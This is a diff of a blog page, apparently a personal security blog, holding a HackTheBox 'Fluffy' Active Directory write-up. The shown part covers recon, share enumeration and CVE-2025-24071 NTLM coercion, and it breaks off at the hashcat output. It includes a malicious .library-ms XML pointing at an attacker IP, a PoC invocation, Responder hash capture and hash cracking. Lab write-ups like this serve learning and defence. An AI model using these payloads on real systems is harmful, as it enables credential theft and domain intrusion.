@@ -1,295 +1,61 @@
-<!DOCTYPE html>
-<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="content-type" content="text/html">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title itemprop="name">HTB: Fluffy | kanyo&#39;s blog</title>
-<meta property="og:title" content="HTB: Fluffy | kanyo&#39;s blog" />
-<meta name="twitter:title" content="HTB: Fluffy | kanyo&#39;s blog" />
-<meta itemprop="name" content="HTB: Fluffy | kanyo&#39;s blog" />
-<meta name="application-name" content="HTB: Fluffy | kanyo&#39;s blog" />
-<meta property="og:site_name" content="" />
-
-<meta name="description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert.">
-<meta itemprop="description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert." />
-<meta property="og:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert." />
-<meta name="twitter:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert." />
-
-<meta property="og:locale" content="en-gb" />
-<meta name="language" content="en-gb" />
-
-  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-fluffy/" title="English" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.161.1">
-
-    
-    <meta property="og:url" content="http://localhost:1313/writeups/htb-fluffy/">
-  <meta property="og:site_name" content="kanyo&#39;s blog">
-  <meta property="og:title" content="HTB: Fluffy">
-  <meta property="og:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert.">
-  <meta property="og:locale" content="en_gb">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2026-06-06T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-06-06T00:00:00+00:00">
-    <meta property="article:tag" content="Esc16">
-    <meta property="article:tag" content="Kerberos">
-    <meta property="article:tag" content="Adcs">
-    <meta property="article:tag" content="Shadow-Credentials">
-    <meta property="article:tag" content="Windows">
-
-
-    
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="HTB: Fluffy">
-  <meta name="twitter:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert.">
-
-
-    
-
-    <link rel="canonical" href="http://localhost:1313/writeups/htb-fluffy/">
-    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
-    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-
-<link rel="manifest" href="http://localhost:1313/site.webmanifest">
-
-<meta name="msapplication-config" content="/browserconfig.xml">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#434648">
-
-    
-    
-</head>
-<body data-theme = "dark" class="notransition">
-
-<script src="/js/theme.js"></script>
-
-<div class="navbar" role="navigation">
-    <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:1313/" class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
-viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
-stroke-linejoin="round" class="feather feather-home">
-<title>Home</title>
-<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-<polyline points="9 22 9 12 15 12 15 22"></polyline>
-</svg>
-        </a>
-        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
-        <label for="menu-trigger">
-            <span class="menu-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
-            </span>
-        </label>
-
-        <div class="trigger">
-            <ul class="trigger-container">
-                
-                
-                <li>
-                    <a class="menu-link " href="/">
-                        Home
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/blogs/">
-                        Blogs
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link active" href="/writeups/">
-                        Writeups
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/about/">
-                        About
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="https://notes.chaelsoo.me">
-                        Cheatsheet
-                    </a>
-                    
-                </li>
-                
-                <li class="menu-separator">
-                    <span>|</span>
-                </li>
-                
-                
-            </ul>
-            <a id="mode" href="#">
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-            </a>
-        </div>
-    </nav>
-</div>
-
-<div class="wrapper post">
-    <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">HTB: Fluffy</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2026-06-06T00:00:00&#43;00:00" itemprop="datePublished"> 6 Jun 2026 </time>
-                </div>
-                
-            </header>
-            
-            <img src="/images/writeups/htb-fluffy/htb-fluffy-pwned.png" alt="HTB: Fluffy" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
-            
-            <div class="toc-container">
-    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
-    <div class="toc-content" id="tocContent">
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#cve-2025-24071-ntlm-coerce-via-library-ms">CVE-2025-24071: NTLM Coerce via .library-ms</a></li>
-    <li><a href="#bloodhound-and-the-acl-path">BloodHound and the ACL Path</a></li>
-    <li><a href="#shadow-credentials-user-flag">Shadow Credentials: User Flag</a></li>
-    <li><a href="#privilege-escalation-esc16">Privilege Escalation: ESC16</a></li>
-  </ul>
-</nav>
-    </div>
-</div>
-
-<div class="mini-toc" id="miniToc">
-    <div class="mini-toc-header">
-        <div class="mini-toc-title">Contents</div>
-        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
-            </svg>
-        </button>
-    </div>
-    <div class="mini-toc-content" id="miniTocContent"></div>
-</div>
-            <div class="page-content">
-                <p>Windows box, Active Directory. What made this one interesting was finding an Upgrade_Notice.pdf in the IT share that listed the exact CVEs the environment was sitting on. A CTF design choice that feels like a realistic IT team tracking their own attack surface and just not getting around to patching it. You&rsquo;re not hunting blind; you&rsquo;re triaging a known vulnerability list.</p>
-<p>The chain hits three distinct techniques: CVE-2025-24071 coerces an NTLMv2 hash from anyone who browses the share, Shadow Credentials via <code>msDS-KeyCredentialLink</code> get you lateral movement without ever touching a password, and ESC16 on the CA exploits a disabled security extension to slip a domain admin certificate past the KDC. Each one has a specific reason it works that&rsquo;s worth understanding properly.</p>
-<h2 id="recon">Recon</h2>
-<p>Standard AD fingerprint from nmap:</p>
-<pre tabindex="0"><code>PORT     STATE SERVICE
+<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Fluffy | kanyo's blog</title><meta property="og:title" content="HTB: Fluffy | kanyo's blog"><meta name=twitter:title content="HTB: Fluffy | kanyo's blog"><meta itemprop=name content="HTB: Fluffy | kanyo's blog"><meta name=application-name content="HTB: Fluffy | kanyo's blog"><meta property="og:site_name" content><meta name=description content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><meta itemprop=description content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><meta property="og:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><meta name=twitter:description content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-fluffy/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-fluffy/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Fluffy"><meta property="og:description" content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-06T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-06T00:00:00+00:00"><meta property="article:tag" content="Esc16"><meta property="article:tag" content="Kerberos"><meta property="article:tag" content="Adcs"><meta property="article:tag" content="Shadow-Credentials"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Fluffy"><meta name=twitter:description content="An Easy Windows box where CVE-2025-24071 coerces an NTLMv2 hash via a malicious .library-ms file. Shadow Credentials get lateral movement into WinRM, and ESC16 issues a domain admin cert."><link rel=canonical href=https://chaelsoo.me/writeups/htb-fluffy/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+</a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
+<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Fluffy</h1><div class=post-meta><time datetime=2026-06-06T00:00:00+00:00 itemprop=datePublished>6 Jun 2026</time></div></header><img src=/images/writeups/htb-fluffy/htb-fluffy-pwned.png alt="HTB: Fluffy" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#cve-2025-24071-ntlm-coerce-via-library-ms>CVE-2025-24071: NTLM Coerce via .library-ms</a></li><li><a href=#bloodhound-and-the-acl-path>BloodHound and the ACL Path</a></li><li><a href=#shadow-credentials-user-flag>Shadow Credentials: User Flag</a></li><li><a href=#privilege-escalation-esc16>Privilege Escalation: ESC16</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
+<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows box, Active Directory. What made this one interesting was finding an Upgrade_Notice.pdf in the IT share that listed the exact CVEs the environment was sitting on. A CTF design choice that feels like a realistic IT team tracking their own attack surface and just not getting around to patching it. You&rsquo;re not hunting blind; you&rsquo;re triaging a known vulnerability list.</p><p>The chain hits three distinct techniques: CVE-2025-24071 coerces an NTLMv2 hash from anyone who browses the share, Shadow Credentials via <code>msDS-KeyCredentialLink</code> get you lateral movement without ever touching a password, and ESC16 on the CA exploits a disabled security extension to slip a domain admin certificate past the KDC. Each one has a specific reason it works that&rsquo;s worth understanding properly.</p><h2 id=recon>Recon</h2><p>Standard AD fingerprint from nmap:</p><pre tabindex=0><code>PORT     STATE SERVICE
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
 389/tcp  open  ldap          (Domain: fluffy.htb)
 445/tcp  open  microsoft-ds
 5985/tcp open  http          (WinRM)
-</code></pre><p>DC01.fluffy.htb, Windows Server 2019, domain <code>fluffy.htb</code>. The WinRM port being open is relevant later. It tells you there&rsquo;s a service account somewhere with remote management access worth targeting.</p>
-<h2 id="cve-2025-24071-ntlm-coerce-via-library-ms">CVE-2025-24071: NTLM Coerce via .library-ms</h2>
-<p>Credentials were provided to start: <code>j.fleischman:J0elTHEM4n1990!</code>. Not a foothold, just a user on the domain.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u j.fleischman -p <span class="s1">&#39;J0elTHEM4n1990!&#39;</span> --shares
-</span></span></code></pre></div><pre tabindex="0"><code>Share           Permissions     Remark
+</code></pre><p>DC01.fluffy.htb, Windows Server 2019, domain <code>fluffy.htb</code>. The WinRM port being open is relevant later. It tells you there&rsquo;s a service account somewhere with remote management access worth targeting.</p><h2 id=cve-2025-24071-ntlm-coerce-via-library-ms>CVE-2025-24071: NTLM Coerce via .library-ms</h2><p>Credentials were provided to start: <code>j.fleischman:J0elTHEM4n1990!</code>. Not a foothold, just a user on the domain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u j.fleischman -p <span class=s1>&#39;J0elTHEM4n1990!&#39;</span> --shares
+</span></span></code></pre></div><pre tabindex=0><code>Share           Permissions     Remark
 -----           -----------     ------
 IPC$            READ            Remote IPC
 IT              READ,WRITE
 NETLOGON        READ            Logon server share
 SYSVOL          READ            Logon server share
-</code></pre><p>The IT share is writable. The contents:</p>
-<pre tabindex="0"><code>Everything-1.4.1.1026.x64.zip
+</code></pre><p>The IT share is writable. The contents:</p><pre tabindex=0><code>Everything-1.4.1.1026.x64.zip
 KeePass-2.58.zip
 Upgrade_Notice.pdf
-</code></pre><p>The PDF had a table of CVEs. The two that mattered immediately: CVE-2025-24071 for Windows File Explorer (NTLM hash leak via <code>.library-ms</code> files) and CVE-2025-46785 for KeePass 2.58. The KeePass angle was tempting given the <code>.kdbx</code> files it likely manages, but a writable SMB share plus an NTLM coerce CVE is a direct path.</p>
-<p>WinRM as j.fleischman was a dead end:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm <span class="nv">$DC</span> -u j.fleischman -p <span class="s1">&#39;J0elTHEM4n1990!&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!</span>
-</span></span></code></pre></div><p><strong>What CVE-2025-24071 does:</strong></p>
-<p>A <code>.library-ms</code> file is a Windows Search Library descriptor: an XML file that tells Explorer where to look for a category of content (documents, music, pictures, etc.). When a user opens a folder containing one, File Explorer automatically connects to every <code>locationProvider</code> URL defined in the file to enumerate contents. This is normal behavior. Explorer is trying to show you the library.</p>
-<p>CVE-2025-24071 is the fact that this connection happens with no user interaction beyond browsing to the folder. No double-click. Just opening the directory makes Explorer send an outbound SMB authentication request to whatever UNC path is in the file. If that path points to your Responder listener, you capture the NTLMv2 hash of whoever browses the share.</p>
-<p>The PoC packages the malicious <code>.library-ms</code> inside a zip. Windows auto-processes library files from extracted archives, which is what actually triggers the coerce.</p>
-<p>I tried building the file manually first:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;searchConnectorDescription&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;iconReference&gt;</span>\\10.10.16.129\share\icon.ico<span class="nt">&lt;/iconReference&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;locationProvider</span> <span class="na">clsid=</span><span class="s">&#34;{9E56BE60-C50F-11CF-9A2C-00A0C90A90CE}&#34;</span><span class="nt">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;propertyBag&gt;</span>
-</span></span><span class="line"><span class="cl">      <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;Url&#34;</span><span class="nt">&gt;</span>\\10.10.16.129\share<span class="nt">&lt;/property&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/propertyBag&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/locationProvider&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/searchConnectorDescription&gt;</span>
-</span></span></code></pre></div><p>That didn&rsquo;t trigger anything. The zip packaging is what makes it work. The raw <code>.library-ms</code> alone isn&rsquo;t processed the same way. I used <a href="https://github.com/Marcejr117/CVE-2025-24071_PoC">Marcejr117&rsquo;s PoC</a> instead:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 PoC.py <span class="nb">test</span> 10.10.16.129
-</span></span><span class="line"><span class="cl"><span class="c1"># [+] File test.library-ms created successfully.</span>
-</span></span></code></pre></div><p>Uploaded <code>exploit.zip</code> to the IT share, started Responder, and waited:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I tun0
-</span></span></code></pre></div><pre tabindex="0"><code>[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+</code></pre><p>The PDF had a table of CVEs. The two that mattered immediately: CVE-2025-24071 for Windows File Explorer (NTLM hash leak via <code>.library-ms</code> files) and CVE-2025-46785 for KeePass 2.58. The KeePass angle was tempting given the <code>.kdbx</code> files it likely manages, but a writable SMB share plus an NTLM coerce CVE is a direct path.</p><p>WinRM as j.fleischman was a dead end:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc winrm <span class=nv>$DC</span> -u j.fleischman -p <span class=s1>&#39;J0elTHEM4n1990!&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!</span>
+</span></span></code></pre></div><p><strong>What CVE-2025-24071 does:</strong></p><p>A <code>.library-ms</code> file is a Windows Search Library descriptor: an XML file that tells Explorer where to look for a category of content (documents, music, pictures, etc.). When a user opens a folder containing one, File Explorer automatically connects to every <code>locationProvider</code> URL defined in the file to enumerate contents. This is normal behavior. Explorer is trying to show you the library.</p><p>CVE-2025-24071 is the fact that this connection happens with no user interaction beyond browsing to the folder. No double-click. Just opening the directory makes Explorer send an outbound SMB authentication request to whatever UNC path is in the file. If that path points to your Responder listener, you capture the NTLMv2 hash of whoever browses the share.</p><p>The PoC packages the malicious <code>.library-ms</code> inside a zip. Windows auto-processes library files from extracted archives, which is what actually triggers the coerce.</p><p>I tried building the file manually first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;searchConnectorDescription&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;iconReference&gt;</span>\\10.10.16.129\share\icon.ico<span class=nt>&lt;/iconReference&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;locationProvider</span> <span class=na>clsid=</span><span class=s>&#34;{9E56BE60-C50F-11CF-9A2C-00A0C90A90CE}&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;propertyBag&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&lt;property</span> <span class=na>name=</span><span class=s>&#34;Url&#34;</span><span class=nt>&gt;</span>\\10.10.16.129\share<span class=nt>&lt;/property&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;/propertyBag&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;/locationProvider&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/searchConnectorDescription&gt;</span>
+</span></span></code></pre></div><p>That didn&rsquo;t trigger anything. The zip packaging is what makes it work. The raw <code>.library-ms</code> alone isn&rsquo;t processed the same way. I used <a href=https://github.com/Marcejr117/CVE-2025-24071_PoC>Marcejr117&rsquo;s PoC</a> instead:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 PoC.py <span class=nb>test</span> 10.10.16.129
+</span></span><span class=line><span class=cl><span class=c1># [+] File test.library-ms created successfully.</span>
+</span></span></code></pre></div><p>Uploaded <code>exploit.zip</code> to the IT share, started Responder, and waited:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo responder -I tun0
+</span></span></code></pre></div><pre tabindex=0><code>[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:adbe02bf4ee78bf6:B001962E0AA4E...
-</code></pre><p>Cracked with hashcat in seconds:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">5600</span> p.agila.hash ~/tools/wordlists/rockyou.txt
-</span></span><span class="line"><span class="cl"><span class="c1"># p.agila::FLUFFY:...:prometheusx-303</span>
